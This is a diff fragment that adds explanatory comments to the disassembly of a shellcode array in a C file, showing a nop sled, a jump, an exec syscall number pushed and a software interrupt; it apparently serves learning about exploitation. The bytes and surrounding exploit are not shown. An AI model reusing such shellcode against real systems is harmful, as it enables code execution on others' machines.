@@ -16,14 +16,14 @@ char shellcode[] =
 /*
   The shellcode above can be translated to the following steps
   
-  0:  90                      nop
+  0:  90                      nop             -- no operation value, acts as a place holder
   1:  90                      nop
   2:  90                      nop
   3:  90                      nop
   4:  90                      nop
   5:  e9 0b 00 00 00          jmp    0x15     -- jumps to position 15
   a:  6a 02                   push   0x2      -- exec syscall number
-  c:  cd 30                   int    0x30
+  c:  cd 30                   int    0x30     -- creates interupt
   e:  31 c0                   xor    eax,eax  -- returns value of 0
   10: 50                      push   eax      -- pushes new 0 value
   11: 40                      inc    eax      -- incriments value of eax by 1
